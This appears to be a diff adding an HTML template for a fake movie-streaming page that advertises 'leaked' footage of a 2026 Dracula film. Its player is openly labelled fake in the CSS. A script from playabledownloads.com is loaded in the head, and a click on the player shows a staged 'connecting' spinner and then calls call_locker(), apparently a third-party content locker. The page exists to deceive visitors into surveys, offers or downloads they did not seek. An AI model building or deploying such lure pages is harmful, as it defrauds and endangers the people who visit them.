@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Watch Dracula (2026) - Exclusive Stream</title>
+    
+    <meta name="description" content="Exclusive unrated preview of Luc Besson's Dracula: A Love Tale (2026). Starring Caleb Landry Jones and Christoph Waltz. Watch the full extended trailer now.">
+    <meta name="keywords" content="Dracula 2026, Luc Besson, Watch Dracula Online, Caleb Landry Jones, Horror Movie 2026, Vampire Movie, Gothic Romance, Full Movie Stream, Exclusive Trailer, Christoph Waltz">
+    
+    <meta property="og:title" content="Dracula: A Love Tale (2026) - Exclusive Leaked Footage">
+    <meta property="og:description" content="The most stylized horror film of the decade. Watch the extended cut before it's taken down.">
+    <meta property="og:image" content="YOUR_IMAGE_FILE_HERE.jpg"> <meta property="og:url" content="https://your-website-url.com">
+    <meta property="og:type" content="video.movie">
+    
+    <script type="text/javascript" src="https://playabledownloads.com/script_include.php?id=1839935"></script>
+
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=Lato:wght@400;700&display=swap" rel="stylesheet">
+    
+    <style>
+        /* ... (Paste the previous CSS styles here) ... */
+        /* --- RESET & BASIC SETUP --- */
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        
+        body {
+            background-color: #050505;
+            font-family: 'Lato', sans-serif;
+            color: #ffffff;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* --- AMBIENT BACKGROUND --- */
+        .background-blur {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            /* IMPORTANT: REPLACE THIS URL WITH YOUR IMAGE */
+            background-image: url('YOUR_IMAGE_FILE_HERE.jpg'); 
+            background-size: cover;
+            background-position: center;
+            filter: blur(20px) brightness(0.4);
+            z-index: 1;
+        }
+
+        /* --- MAIN CONTAINER --- */
+        .container {
+            position: relative;
+            z-index: 10;
+            width: 90%;
+            max-width: 900px;
+            text-align: left;
+            animation: fadeIn 1s ease-out;
+        }
+
+        /* --- HEADER & TITLE --- */
+        .movie-header {
+            margin-bottom: 20px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.8);
+        }
+        
+        h1 {
+            font-family: 'Cinzel', serif;
+            font-size: 2.5rem;
+            color: #fff;
+            margin-bottom: 5px;
+            letter-spacing: 2px;
+        }
+
+        .meta-tags {
+            font-size: 0.9rem;
+            color: #ccc;
+            display: flex;
+            gap: 15px;
+            align-items: center;
+        }
+
+        .tag {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            font-weight: bold;
+        }
+
+        /* --- THE FAKE PLAYER --- */
+        .video-wrapper {
+            position: relative;
+            width: 100%;
+            padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
+            background: #000;
+            border-radius: 8px;
+            box-shadow: 0 0 30px rgba(138, 3, 3, 0.4); /* Blood Red Glow */
+            overflow: hidden;
+            border: 1px solid #333;
+            cursor: pointer;
+        }
+
+        .video-poster {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            /* IMPORTANT: REPLACE THIS URL WITH YOUR IMAGE */
+            background-image: url('YOUR_IMAGE_FILE_HERE.jpg'); 
+            background-size: cover;
+            background-position: center;
+            transition: transform 0.3s ease;
+        }
+
+        /* Hover Effect: slight zoom */
+        .video-wrapper:hover .video-poster {
+            transform: scale(1.02);
+            opacity: 0.8;
+        }
+
+        /* --- PLAY BUTTON --- */
+        .play-overlay {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80px;
+            height: 80px;
+            background: rgba(138, 3, 3, 0.9); /* Blood Red */
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 0 0 rgba(138, 3, 3, 0.7);
+            animation: pulse 2s infinite;
+        }
+
+        .play-triangle {
+            width: 0; 
+            height: 0; 
+            border-top: 15px solid transparent;
+            border-bottom: 15px solid transparent;
+            border-left: 25px solid white;
+            margin-left: 5px;
+        }
+
+        /* --- FAKE CONTROLS --- */
+        .fake-controls {
+            position: absolute;
+            bottom: 0; left: 0; width: 100%;
+            padding: 15px;
+            background: linear-gradient(to top, rgba(0,0,0,0.9), transparent);
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .progress-bar {
+            flex-grow: 1;
+            height: 4px;
+            background: rgba(255,255,255,0.3);
+            border-radius: 2px;
+            position: relative;
+        }
+
+        .progress-fill {
+            width: 0%; 
+            height: 100%;
+            background: #8a0303;
+        }
+
+        /* --- DESCRIPTION --- */
+        .description {
+            margin-top: 25px;
+            color: #ddd;
+            line-height: 1.6;
+            font-size: 0.95rem;
+            max-width: 800px;
+        }
+
+        .description strong { color: #fff; }
+
+        /* --- ANIMATIONS --- */
+        @keyframes pulse {
+            0% { transform: translate(-50%, -50%) scale(0.95); box-shadow: 0 0 0 0 rgba(138, 3, 3, 0.7); }
+            70% { transform: translate(-50%, -50%) scale(1); box-shadow: 0 0 0 20px rgba(138, 3, 3, 0); }
+            100% { transform: translate(-50%, -50%) scale(0.95); box-shadow: 0 0 0 0 rgba(138, 3, 3, 0); }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Mobile Adjustments */
+        @media (max-width: 600px) {
+            h1 { font-size: 1.8rem; }
+            .play-overlay { width: 60px; height: 60px; }
+            .play-triangle { border-left: 20px solid white; border-top: 12px solid transparent; border-bottom: 12px solid transparent; }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="background-blur"></div>
+
+    <div class="container">
+        <div class="movie-header">
+            <h1>Dracula: A Love Tale</h1>
+            <div class="meta-tags">
+                <span class="tag">HD</span>
+                <span class="tag">R</span>
+                <span>2026</span>
+                <span>•</span>
+                <span>Horror / Romance</span>
+                <span>•</span>
+                <span>2h 15m</span>
+            </div>
+        </div>
+
+        <div class="video-wrapper" onclick="triggerLocker()">
+            <div class="video-poster"></div>
+            
+            <div class="play-overlay">
+                <div class="play-triangle"></div>
+            </div>
+
+            <div class="fake-controls">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M8 5v14l11-7z"/></svg>
+                <div class="progress-bar">
+                    <div class="progress-fill"></div>
+                </div>
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02z"/></svg>
+            </div>
+        </div>
+
+        <div class="description">
+            <p><strong>Synopsis:</strong> Luc Besson directs this gothic reimagining of the classic vampire myth. Caleb Landry Jones stars as the Count in a tragic tale of eternal love and bloodlust. <strong>Stream the exclusive leaked preview now.</strong></p>
+        </div>
+    </div>
+
+    <script>
+        function triggerLocker() {
+            // 1. Change the Play Button to a Loading Spinner
+            const playBtn = document.querySelector('.play-overlay');
+            playBtn.style.animation = 'none'; // Stop pulsing
+            playBtn.innerHTML = '<div style="border: 4px solid #f3f3f3; border-top: 4px solid #8a0303; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite;"></div>';
+            
+            // 2. Wait 800ms (Simulates "Connecting to Server...")
+            setTimeout(function() {
+                
+                // 3. TRIGGER YOUR LOCKER
+                call_locker();
+                
+            }, 800);
+        }
+    </script>
+</body>
+</html>
